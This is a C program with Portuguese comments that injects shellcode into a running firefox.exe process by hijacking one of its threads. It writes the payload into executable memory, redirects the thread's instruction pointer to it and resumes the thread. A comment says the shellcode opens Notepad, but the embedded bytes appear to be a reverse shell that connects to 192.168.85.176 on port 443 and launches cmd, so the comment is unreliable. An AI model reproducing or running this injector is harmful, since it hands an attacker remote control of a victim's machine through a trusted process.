#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode de exemplo (abrir o bloco de notas)
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x55\xb0"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"; // Substituir por shellcode real

// Função para encontrar o processo alvo pelo nome
DWORD FindTargetProcess(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

// Função para encontrar o primeiro thread de um processo
DWORD FindThreadInProcess(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);

    DWORD threadId = 0;
    if (Thread32First(snapshot, &entry)) {
        do {
            if (entry.th32OwnerProcessID == pid) {
                threadId = entry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return threadId;
}

// Função principal de hijacking
void HijackThread(DWORD pid, DWORD tid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    if (!hProcess || !hThread) {
        printf("[-] Falha ao abrir o processo ou thread.\n");
        return;
    }

    // Alocar memória para o shellcode no processo alvo
    LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteShellcode, shellcode, sizeof(shellcode), NULL);

    // Suspender o thread para manipulação segura
    SuspendThread(hThread);

    // Obter o contexto atual do thread
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

#ifdef _WIN64
    // Redirecionar o RIP (64 bits) para o shellcode
    ctx.Rip = (DWORD64)remoteShellcode;
#else
    // Redirecionar o EIP (32 bits) para o shellcode
    ctx.Eip = (DWORD)remoteShellcode;
#endif

    // Atualizar o contexto do thread com o novo ponteiro de instrução
    SetThreadContext(hThread, &ctx);

    // Retomar o thread para executar o shellcode
    ResumeThread(hThread);

    printf("[+] Thread hijacked com sucesso!\n");

    // Limpeza
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    // Alvo: Processo "firefox.exe"
    DWORD pid = FindTargetProcess(L"firefox.exe");
    if (!pid) {
        printf("[-] Processo alvo não encontrado.\n");
        return -1;
    }

    printf("[+] Processo alvo encontrado: PID %d\n", pid);

    // Encontrar o primeiro thread do processo
    DWORD tid = FindThreadInProcess(pid);
    if (!tid) {
        printf("[-] Nenhum thread encontrado no processo.\n");
        return -1;
    }

    printf("[+] Thread alvo encontrado: TID %d\n", tid);

    // Realizar o hijacking
    HijackThread(pid, tid);

    return 0;
}
